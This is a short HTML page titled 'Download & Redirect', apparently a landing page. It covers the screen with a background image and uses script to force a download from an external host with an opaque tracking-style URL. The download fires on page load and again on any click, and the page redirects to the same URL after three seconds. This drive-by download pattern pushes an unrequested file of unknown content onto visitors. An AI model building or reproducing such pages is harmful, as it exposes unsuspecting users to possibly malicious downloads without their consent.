<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Download & Redirect</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    background: url('1000004350.jpg') no-repeat center center fixed;
    background-size: cover;
    cursor: pointer;
  }
</style>
</head>
<body>

<script>
  const downloadUrl = "https://hlpryn.com/aw/b2cyiq?rtk=qNEXhlIxio35CaM3G5TgQzfjkJ2GkiDOmqxHW4CqU1UnGRqmF1UZtd358OUe70DnLYO5Ecrt5byd7XA1ecaDcmckg1GmndS%2F0mYi9jiOMdn%2Bcdm3rFNngPKek4uD4%2BrKnH0zYsuMHpqrzww%2FCqNyBwIEwzky9BwdMKzPo66J8dqqVHGle5hJ%2FKKxyovkYfNN&scene=null";

  function triggerDownload(url) {
    const a = document.createElement('a');
    a.href = url;
    a.download = '';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  window.onload = () => {
    // Try auto download (may be blocked)
    triggerDownload(downloadUrl);

    // After 3 seconds, redirect to downloadUrl
    setTimeout(() => {
      window.location.href = downloadUrl;
    }, 3000);
  };

  // Also trigger download on any click before redirect happens
  document.body.addEventListener('click', () => {
    triggerDownload(downloadUrl);
  });
</script>

</body>
</html>
